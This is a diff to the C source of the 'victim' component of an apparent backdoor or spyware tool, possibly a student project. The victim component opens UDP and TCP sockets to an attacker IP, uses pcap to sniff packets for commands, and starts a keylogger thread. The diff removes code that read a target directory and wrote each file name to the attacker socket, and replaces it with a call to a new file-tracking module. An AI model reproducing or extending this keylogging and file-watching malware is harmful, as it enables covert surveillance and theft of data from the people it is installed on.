@@ -1,5 +1,6 @@
 #include "victim.h"
 #include "keylogger.h"
+#include "filetracker.h"
 #include "extern.h"
 
 
@@ -14,11 +15,11 @@ int main(int argc, char *argv[]) {
     bpf_u_int32 netp;
     bpf_u_int32 maskp;
 
+    signal(SIGINT,sig_handler);
     program_setup();
     options_victim_init(&opts);
     create_socket(&opts, 'V', 'U', opts.dest_ip, ATC_UDP_PORT);
     create_socket(&opts, 'V', 'T', opts.dest_ip, ATC_TCP_PORT);
-    opts.file_list = createLinkedList();
     puts("============ Initialize VICTIM ============");
     fflush(stdout);
 
@@ -54,7 +55,7 @@ int main(int argc, char *argv[]) {
         fprintf(stderr,"Error setting filter\n");
         exit(1);
     }
-    pcap_loop(nic_fd, DEFAULT_COUNT, pkt_callback, args);
+    pcap_loop(nic_fd, PACKET_COUNT, pkt_callback, args);
     return EXIT_SUCCESS;
 }
 
@@ -328,82 +329,20 @@ void* activate_keylogger(void* arg){
     }
     puts("KEYLOGGER ACTIVATED");
     keylogger_main(ov);
+    return NULL;
 }
 
 
 void* check_directory(void* arg) {
     struct options_victim* ov;
-    DIR *dir;
-    struct dirent *entry;
-    bool check_flag = FALSE;
-    int index = 0;
-    char* array[30] = {0};
-    char file_name[64] = {0};
-    char buffer[OUTPUT_SIZE] = {0};
 
     ov = (struct options_victim*) arg;
     while(1) {
-        if (check_flag == TRUE) {
-            while(1) {
-                dir = opendir(ov->target_directory);
-                if (dir == NULL) {
-                    printf("Failed to open the directory.\n");
-                }
-                while ((entry = readdir(dir)) != NULL) {
-                    if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
-                        if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name, ".directory") != 0) {
-                            if (strcmp(entry->d_name, getLLElement(ov->file_list, index)->file_name) != 0) {
-                                strncpy(file_name, entry->d_name, strlen(entry->d_name));
-                                file_name[strlen(entry->d_name)] = '\n';
-                                write(ov->attacker_socket, file_name, strlen(entry->d_name) + 1);
-                                index++;
-                                break;
-                            }
-                        }
-                    }
-                }
-                index = 0;
-            }
+        if (ov->target == TRUE) {
+            break;
         }
-
-        while (1) {
-            if (ov->target == TRUE) {
-                break;
-            }
-        }
-
-        // Open the directory
-        // Read directory entries
-        dir = opendir(ov->target_directory);
-        if (dir == NULL) {
-            printf("Failed to open the directory.\n");
-        }
-
-        while ((entry = readdir(dir)) != NULL) {
-            if (entry->d_type == DT_REG || entry->d_type == DT_DIR) {
-                if (strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0 && strcmp(entry->d_name, ".directory") != 0) {
-                    if (check_flag == FALSE) {
-                        ListNode file_node = {0,};
-                        //                        printf("%s\n", entry->d_name);
-                        strncpy(file_name, entry->d_name, strlen(entry->d_name));
-                        file_name[strlen(entry->d_name)] = '\n';
-                        write(ov->attacker_socket, file_name, strlen(entry->d_name) + 1);
-                        memset(file_name, 0, sizeof(file_name));
-
-                        strcpy(file_node.file_name, entry->d_name);
-                        addLLElement(ov->file_list, ov->file_count, file_node);
-                        ov->file_count++;
-                    }
-                }
-            }
-        }
-        check_flag = TRUE;
-
-
-
-        // Close the directory
-        closedir(dir);
-
-        ov->target = FALSE;
     }
+    track_file(ov);
+    ov->target = FALSE;
+    return NULL;
 }
